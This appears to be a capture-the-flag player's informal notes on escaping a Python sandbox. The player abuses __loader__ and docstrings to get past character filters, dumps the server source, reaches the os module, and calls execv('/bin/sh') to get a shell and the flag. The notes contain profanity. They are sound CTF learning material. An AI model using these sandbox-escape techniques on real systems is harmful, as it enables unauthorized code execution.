Good builtins:
- __loader__
- all
- eval
- print (??) what the fuck version is this? must be 3 (!)
- repr
- str

Observations:
- open is "Denied", /not/ undefined
- __loader__ is a SourceFileLoader, implying our shit is going into a file and being exec'd

Path of exploitation:
- First enumerated what was accepted in terms of input
- Wrote tooling to reimplement the filtering algorithm
- Used this tooling to find what I could poke at
- Started fucking with `__loader__`, realized I could abuse docstrings of things to get the forbidden characters, then implemented doing that automatically in my tool
- Fucked around some more with it to get at the internal attributes of the ALLES function, found the filename of the server, and knowing that I had a primitive to dump files in __loader__.get_data, I dumped the source code of the server
- Now I could eval arbitrary code, and had to figure out how to escape
- Didn't realize that builtins are the same for every single Python file so we couldn't steal them from other ones, which took a very long time
- Took way too long to decide to run the challenge locally and turn off all the security so I could see what was going on better and use more variables
- Tried to use a reverse shell
- Eventually got some sense with https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes, found I could get a reference to the _os module from the inside of __loader__, and called execv("/bin/sh", ("/bin/sh",)), poked around, and dumped the flag

- Since I escaped I just fucked around with it locally, and this happened:
